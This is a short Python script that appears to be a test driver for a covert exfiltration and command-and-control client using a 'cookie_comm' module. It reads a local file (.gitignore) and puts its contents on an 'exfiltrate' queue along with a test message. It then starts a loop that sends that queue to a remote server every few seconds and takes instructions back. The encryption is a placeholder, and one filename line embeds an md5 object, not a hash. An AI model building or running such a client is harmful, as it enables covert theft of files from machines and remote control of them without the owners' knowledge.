from cookie_comm import communication_client_main, read_file
from queue import Queue
from uuid import uuid1
import os
from hashlib import md5


def enc(data):
    return data

def dec(data):
    return data

if __name__ == '__main__':
    exfiltrate = Queue()
    instructions = Queue()

    print(os.getcwd())
    # generate uuid1
    string = "hallo 💔🦄 erik und felix, das ist eine test nachricht die ganzschön lang 🐳 ist."
    stream = read_file(".gitignore")


    exfiltrate.put(string)
    exfiltrate.put({'filename': f".gitignore {md5()}", 'data': stream})

    client_id = str(uuid1())
    communication_client_main(client_id, exfiltrate, instructions, enc, time_between_requests=4)